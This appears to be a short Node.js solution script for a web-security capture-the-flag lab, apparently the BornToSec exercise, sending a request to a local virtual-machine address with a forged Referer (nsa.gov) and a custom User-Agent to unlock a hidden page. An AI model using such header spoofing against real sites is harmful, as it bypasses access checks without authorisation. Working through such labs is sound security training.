import fetch from 'node-fetch';

fetch('http://192.168.56.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f', {
    method: 'GET',
    headers: {
        'Referer': 'https://www.nsa.gov/',
        'User-Agent': "ft_bornToSec"

    }
}).then(response => response.text()).then(data => console.log(data))